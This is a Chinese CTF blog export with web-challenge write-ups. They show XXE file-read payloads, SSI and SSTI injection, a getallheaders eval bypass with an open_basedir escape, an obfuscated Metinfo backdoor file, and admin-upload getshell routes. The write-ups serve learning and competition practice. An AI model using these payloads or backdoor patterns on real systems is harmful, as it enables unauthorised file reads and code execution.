<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-6f46836651fe64cb.png" alt><br>application/json应该都很熟悉了，把json改成xml进行XXE注入，参考文章：<a href="https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：" target="_blank" rel="noopener">https://landgrey.me/XMLBeam-XXE-Simple-Analysis/，发现构造：</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Cyc1e<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">age</span>&gt;</span>11<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>时有一样的回显，那么就是CVE-2018-1259的洞了，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-1722740048a470fb.png" alt></p>
<h3 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h3><p>这道题算非预期了，出题人木有把两个题目分开，所以导致捡漏了，看题目描述是同一个组件造成的RCE，那解法应该是参考：<a href="https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。" target="_blank" rel="noopener">https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/（没有去复现尝试）。</a><br>由于和上一题共用同一个环境，flag都放在根目录下，那也就是文件名的问题，但是XXE是可以列目录的，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-cda1cc7ce24b816a.png" alt></p>
<p>可以直接列出更目录，很清楚的，RCE这题的flag就摆在这了，捡漏捡漏。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f7c81d5cf632f968.png" alt></p>
<h3 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h3><p>题目提示为SSI，刚开始看成了SSTI，一直在怒怼PHP的模版注入，坑了我好一段时间……既然是SSI，那就可以利用include来尝试包含本地文件</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-67fbe593dc44f929.png" alt>我们利用include virtual，构造payload：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">name=<span class="comment">&lt;!--%23include virtual="flag" --&gt;</span></span><br></pre></td></tr></table></figure>
<p>就可以得到flag，这里主要在于#号需要urlencode一下。</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-51fe24d6a7b94456.png" alt></p>
<h3 id="SimpleWasmReverse"><a href="#SimpleWasmReverse" class="headerlink" title="SimpleWasmReverse"></a>SimpleWasmReverse</h3><p>这题最后卡wasm逆向上了，蛮写写思路</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-f218ccef0572771d.png" alt>把flag.js下载到本地分析，可以看到调用了一个flag.wasm文件</p>
<p><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-8443127bdac0d0e2.png" alt>)可以下载到flag.wasm进行分析，找到了一篇类似题目的writeup：<a href="https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数" target="_blank" rel="noopener">https://tipi-hack.github.io/2018/04/01/quals-NDH-18-assemblyme.html，参照题目进行js调试判断调用函数，在check()函数上下断点跟进，可以看到调用了wasm中的$func53函数</a><br><img src="/2018/11/16/2018%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9BWeb-Writeup/8418106-be2040dcaa949ed3.jpg" alt></p>
<p>所以接下来要做的主要就是反编译wasm文件，找到$func53函数进行分析，奈何wasm反编译后是3M的C源码。。。。。。而且变量名都变了，作为一个逆向只好爆破什么的来说，到这就放弃了，思路肯定是没毛病的了，分析调用的函数就可以的到flag{xxxxxx}，页面提交就可以得到flag的吧，坐等Writeup</p>
<p><strong>题目相对比较简单，差一题ak比较可惜，不过也不会逆向，木有办法，仅供学习。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>SQL</tag>
        <tag>XXE</tag>
        <tag>SSI</tag>
      </tags>
  </entry>
  <entry>
    <title>护网杯预选赛两个头大的Web题</title>
    <url>/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/</url>
    <content><![CDATA[<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>拿到AAoHAR1WX1VQVlNVU1VRUl5XXyMjI1FWJ1IjUCQnXlZWXyckXhs=，提示是异或，没想到的是和多少异或，所以签到题卡了半天（菜哭），写脚本测试</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-3839db9d9d10a201.png" alt></p>
<p>每一位和0~105异或的时候可以得到flag：flag{09360535374819EEE70A4E6BA8009AB8}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、EASY-TORNADO"><a href="#一、EASY-TORNADO" class="headerlink" title="一、EASY_TORNADO"></a>一、EASY_TORNADO</h2><p>在hint.txt得到了signature的算法为md5(cookie_secret + md5(filename))，有在flag.txt里得到了flag文件为/fllllllllllag，那思路很明确就是算出signature，然后读取/fllllllllllag文件里的内容就可以，其中cookie_secret是未知的，通过/error?msg= 可以发现msg参数存在ssti</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-9ad29bc329b751e2.png" alt>接下来就是爬坑的半天，下意识以为cookie_secret是在cookie里，打了半天的cookie，都不知道该调用什么函数来做了……  然后在handle对象中发现了cookie_secret（为什么会在这个地方呢，有点迷！）</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-7ca1b782b9107adb.png" alt></p>
<p>拿到cookie_secret了题目就简单了，写一个计算signature的php代码：</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-27ffeedbdb560700.png" alt></p>
<p>计算得出signature，直接访问payload：/file?filename=/fllllllllllag&amp;signature=240eaef73c2f70d5e30051d91417a18c</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-97ff2886094c7e53.png" alt></p>
<h2 id="二、ITSHOP"><a href="#二、ITSHOP" class="headerlink" title="二、ITSHOP"></a>二、ITSHOP</h2><p>这题懵了比较久，半天没有什么思路的。最终通过条件竞争和整数溢出解题。<br>首先发现可以条件竞争，因为要5包大辣条才可以换1包辣条之王，而只给了买4包的钱，那么要么通过伪造数据，要么就是条件竞争用5元买多包辣条了……这个逻辑没毛病，各种伪造测试不通，就尝试条件竞争，用brupsuit多线程跑，把线程设置大一些</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-88c5e43f56f94734.png" alt></p>
<p>就可以买到超过4包数量的大辣条。</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-e652be648b88d8db.png" alt></p>
<p>第二点在于整数溢出，毕竟想要条件竞争得到9999999*5包大辣条不可能，所以要么伪造数据，要么就是整数溢出，伪造数据前面说了是不通的，所以就尝试整数溢出,长整型整数最大为0XFFFFFFFFFFFFFFFF,那么0XFFFFFFFFFFFFFFFF + 1 就可以造成溢出，又因为5包大辣条换一包辣条之王，所以可以换的辣条之王的最大值应该是0XFFFFFFFFFFFFFFFF/5，所以批量换辣条之王的数量应该是0XFFFFFFFFFFFFFFFF/5 + 1 转化为整数为：3689348814741910324</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-f6791ad3e9d54e69.png" alt></p>
<p>成功溢出换得<strong>*****</strong>（反正用不完的）数量的辣条之王，接下来直接兑换Flag就好了</p>
<p><img src="/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AF%E9%A2%84%E9%80%89%E8%B5%9B%E4%B8%A4%E4%B8%AA%E5%A4%B4%E5%A4%A7%E7%9A%84Web%E9%A2%98/8418106-20e546370620f0f8-1583312993362.png" alt></p>
<p><strong>时间比较短，这两题花了些时间，然后又双叒叕开始滑水了……</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>逻辑</tag>
        <tag>cookie_secret</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF-R-CURSIVE</title>
    <url>/2018/10/14/RCTF-R-CURSIVE/</url>
    <content><![CDATA[<p>这次的rctf没怎么看，傍晚开始看 r-cursive 这题，源码特别简单:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) === <span class="string">'9944105bfb8294278dbf87f4c52e8476ebf9ab68'</span> ?: <span class="keyword">die</span>();</span><br><span class="line"><span class="string">';'</span> === preg_replace(<span class="string">'/[^\W_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'cmd'</span>]) ? <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]) : show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>这里主要有正则，<code>preg_replace(&#39;/[^\W_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;cmd&#39;])</code>，\w 就很烦人了，所以首先要做的就是过这个正则达到任意执行。通过构造cmd=eval(next(getallheaders()));在请求头里插入可执行代码来达到任意执行(这里不止next可以用，主要就是决定你构造代码放在header的什么位置，还有implode，end…..都可以用)我用的是next就是，执行代码插在user_agent中：</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-c17d1e0247b7b179-1583307607135.png" alt></p>
<p>那么接下来也就是要列出目录，找到flag文件了，这里卡了好久，主要要做的就是绕过openbase_dir的限制，把出了/tmp目录和index.php所在目录除外的其他目录给列出来</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-7fd934ffcfedf20f.png" alt></p>
<p>最后通过opendir + glob://协议列出目录：</p>
<p><code>if($dh=opendir(&quot;glob:///var\*/www\*/sandbox\*/\*&quot;)){while(($file=readdir($dh))!==false){echo&quot;$file\n&quot;;}closedir($dh);}</code></p>
<p>一波谜一样的操作</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-f8dd88d7fe7e973c.png" alt></p>
<p>发现众多token文件夹后面夹生这init.php和php.ini，猜测flag应该是放在init.php里了，但是我们的权限是在 78854209fa4889d51dd0016ceab319f852d90ec9 文件夹下面的，因为vhost_alias的配置的原因，所以我们默认进入网站的时候是在token目录下的，因为openbase_dir的限制，直接读取init.php文件是读不到的</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-a753f240ddb7aaf1.png" alt></p>
<p>这里可以想想因为我们默认是在token文件夹里，所以我们可以正常读取index.php的源码，那如果我们出了token文件夹，那也就可以正常读取init.php文件了所以我们可以修改请求时的URL:<a href="http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()" target="_blank" rel="noopener">http://78854209fa4889d51dd0016ceab319f852d90ec9.sandbox.r-cursive.ml:1337/78854209fa4889d51dd0016ceab319f852d90ec9/?cmd=eval(next(getallheaders()</a>)); 修改请求头中的HOST为:.sandbox.r-cursive.ml:1337，利用file_get_contents()函数来读取init.php文件</p>
<p><img src="/2018/10/14/RCTF-R-CURSIVE/8418106-fa9223d7f5547395.png" alt></p>
<p>这样也就跨出限制，成功读取到flag。</p>
<p><strong>比赛滑水，也就只看了这道题，其他的题看都没看，不过这次比赛题目质量真心好，有时间都可以做做，仅写来供自己学习记录用。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>open_basedir</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>2017上海赛线下攻防Web题分析</title>
    <url>/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>首先会回过头来重新分析一次这道web题主要是因为上次线下的时候全场一直在打了一个洞，最后成信的师傅用重置数据库方法，从后台getshell一路追分，这里先膜一发。这次web题的框架是Metinfo 5.3.17的。</p>
<h2 id="0x01-后台getshell"><a href="#0x01-后台getshell" class="headerlink" title="0x01 后台getshell"></a>0x01 后台getshell</h2><p>这个洞也可以说是坑了一波，以前都调过Metinfo的后台恢复数据库文件getshell，在：安全—&gt;备份与恢复 中通过上传数据库备份.zip文件getshell，这里主要是因为:admin\include\uploadify.php</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">elseif($type==<span class="string">'skin'</span>)&#123;</span><br><span class="line">/*模板文件*<span class="regexp">/</span></span><br><span class="line"><span class="regexp">$filetype=explode('.',$_FILES['Filedata']['name']);</span></span><br><span class="line"><span class="regexp">if($filetype[count($filetype)-1]=='zip')&#123;</span></span><br><span class="line"><span class="regexp">if(stristr($met_file_format,'zip') === false)&#123;</span></span><br><span class="line"><span class="regexp">echo $lang_jsx36;</span></span><br><span class="line"><span class="regexp">die();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/if(!is_writable('../</span>../templates/<span class="string">'))@chmod('</span>../../templates/<span class="string">',0777);</span></span><br><span class="line"><span class="string">$filenamearray=explode('</span>.zip<span class="string">',$_FILES['</span>Filedata<span class="string">']['</span>name<span class="string">']);</span></span><br><span class="line"><span class="string">$skin_if=$db-&gt;get_one("SELECT * FROM &#123;$met_skin_table&#125; WHERE skin_file='</span>&#123;$filenamearray[<span class="number">0</span>]&#125;<span class="string">'");</span></span><br><span class="line"><span class="string">if($skin_if)&#123;</span></span><br><span class="line"><span class="string">$metinfo=$lang_loginSkin;</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">$f = new upfile('</span>zip<span class="string">','</span>../../templates/<span class="string">','</span><span class="string">','</span><span class="string">');</span></span><br><span class="line"><span class="string">if($f-&gt;get_error())&#123;</span></span><br><span class="line"><span class="string">echo $f-&gt;get_errorcode();</span></span><br><span class="line"><span class="string">die();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(file_exists('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">'))$filenamearray[0]='</span>metinfo<span class="string">'.$filenamearray[0];</span></span><br><span class="line"><span class="string">$met_upsql = $f-&gt;upload('</span>Filedata<span class="string">',$filenamearray[0]);</span></span><br><span class="line"><span class="string">include "pclzip.lib.php";</span></span><br><span class="line"><span class="string">$archive = new PclZip('</span>../../templates/<span class="string">'.$filenamearray[0].'</span>.zip<span class="string">');</span></span><br><span class="line"><span class="string">if($archive-&gt;extract(PCLZIP_OPT_PATH, '</span>../../templates/<span class="string">') == 0)$metinfo=$archive-&gt;errorInfo(true);</span></span><br><span class="line"><span class="string">$list = $archive-&gt;listContent();</span></span><br><span class="line"><span class="string">$error=0;</span></span><br><span class="line"><span class="string">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="string">if(preg_match("/\.(asp|aspx|jsp)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$error=1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(!is_dir('</span>../../templates/<span class="string">'.$val[filename])&amp;&amp;preg_match("/\.(php)/i",$val[filename]))&#123;</span></span><br><span class="line"><span class="string">$danger=explode('</span><span class="params">|','preg_replace|</span>assert<span class="params">|dirname|</span>file_exists<span class="params">|file_get_contents|</span>file_put_contents<span class="params">|fopen|</span>mkdir<span class="params">|unlink|</span>readfile<span class="params">|eval|</span>cmd<span class="params">|passthru|</span>system<span class="params">|gzuncompress|</span>exec<span class="params">|shell_exec|</span>fsockopen<span class="params">|pfsockopen|</span>proc_open<span class="params">|scandir');</span></span><br><span class="line"><span class="params">$ban='preg_replace|</span>assert<span class="params">|eval|</span>\$_POST<span class="params">|\$_GET';</span></span><br><span class="line"><span class="params">foreach($danger as $key1 =&gt; $val1)&#123;</span></span><br><span class="line"><span class="params">$str=file_get_contents('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">$str=str_replace(array('\'','"','.'),'',$str);</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match("/([^A-Za-z0-9_]$val1)[\r\n\t]&#123;0,&#125;([\[\(])/i",$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(preg_match('/('.$ban.')/i',$str))&#123;</span></span><br><span class="line"><span class="params">$error=1;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params"></span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$filenamearray[0].'.zip');</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>($error)&#123;</span></span><br><span class="line"><span class="params">foreach($list as $key=&gt;$val)&#123;</span></span><br><span class="line"><span class="params"><span class="keyword">if</span>(is_dir('../../templates/'.$val[filename]))&#123;</span></span><br><span class="line"><span class="params">@deldir('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">@unlink('../../templates/'.$val[filename]);</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">$metinfo='含有危险函数，禁止上传！！';</span></span><br><span class="line"><span class="params">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="params">$metinfo='1$'.$filenamearray[0];</span></span><br><span class="line"><span class="params">&#125;</span></span><br><span class="line"><span class="params">&#125;</span></span><br></pre></td></tr></table></figure>
<p>上传的.zip文件会自动解压，上传成功后在/templates目录下生成shell，由于本次源码被调整过，在恢复备份文件处有一个资源调用的问题，导致打开的时候特别慢，可以说没法利用吧，而这次主要是利用另一个上传点，直接通过修改上传文件类型来上传.php文件：安全-&gt;安全与效率-&gt;上传文件<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-bc2325f23d35affd.png" alt><br>这种getshell的方法不要智商的，所以就不多说了。</p>
<h2 id="0x02-混淆源码命令执行"><a href="#0x02-混淆源码命令执行" class="headerlink" title="0x02 混淆源码命令执行"></a>0x02 混淆源码命令执行</h2><p>利用点：produ/picture.inc.php文件，源码进行混淆过，所以挖掘的时候必须首先解混淆，这里我是直接上网进行源码修复的，修复出来简单修改一下变量也基本就能看懂。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># MetInfo Enterprise Content Management System </span></span><br><span class="line"><span class="comment"># Copyright (C) MetInfo Co.,Ltd (http:</span></span><br><span class="line">$b=@$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Y2hlYw=='</span>)];</span><br><span class="line"><span class="keyword">if</span> ($b!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$a = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($b),<span class="number">0</span>,<span class="number">9</span>);</span><br><span class="line">	$c = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSUkx'</span>)](md5($a),<span class="number">5</span>,<span class="number">18</span>);</span><br><span class="line">	$c = md5($c);</span><br><span class="line">	echo $c;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$d = @$_GET[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'img_tet'</span>)];</span><br><span class="line">$d = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSWwx'</span>)]($d);</span><br><span class="line">$d = str_replace( $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'flag'</span>),<span class="string">""</span>,$d);</span><br><span class="line"><span class="keyword">if</span> ($d!=<span class="string">""</span>) </span><br><span class="line">&#123;</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Type: imgage/jpeg'</span>));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Disposition: attachment; filename='</span>).$d);</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFJ'</span>)]($GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Content-Lengh: '</span>).$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$e = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbElJ'</span>)]($d,<span class="string">"r"</span>) <span class="keyword">or</span> die(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">	$f = $GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbEkx'</span>)]($e,$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJSTFs'</span>)]($d));</span><br><span class="line">	$GLOBALS[$GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'SUlJSUlJSUlJbGxJ'</span>)]($e);</span><br><span class="line">	echo $f;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">echo $GLOBALS[<span class="string">'OOO0000O0'</span>](<span class="string">'Cg=='</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是Get一个参数img_tet,检测传参内容是否有flag，有的话就替换为空格所以直接利用：cat /flflagag就可以绕过检测，这也是全场一次在打的一个洞。下面也贴出其他师傅解混淆的方法，建一个php文件</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'picture.inc.php'</span>);</span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>调用函数var_dump(get_defined_vars())进行反混淆，本地运行可以得到一样的源码。<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-15bd7af93d209fda.png" alt><br>这里直接贴出BXS师傅完全修复的源码：<img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-8fdc8f0abaf18052.jpg" alt></p>
<h2 id="0x03-重置数据库"><a href="#0x03-重置数据库" class="headerlink" title="0x03 重置数据库"></a>0x03 重置数据库</h2><p>利用安装框架的配置文件，重置数据库这个也是迷，不过利用起来也是没有难度的，主要就看能不能找到这个页面了，估计是主办方故意留下这个页面的，利用方法，直接访问 \include\frame 目录下 index.php，直接就进入了配置页面<br><img src="/2017/12/12/2017%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2Web%E9%A2%98%E5%88%86%E6%9E%90/8418106-a677562380059b89.png" alt></p>
<p>跟着走一遍，重置一下网站，然后跳第一步Getshell就好。</p>
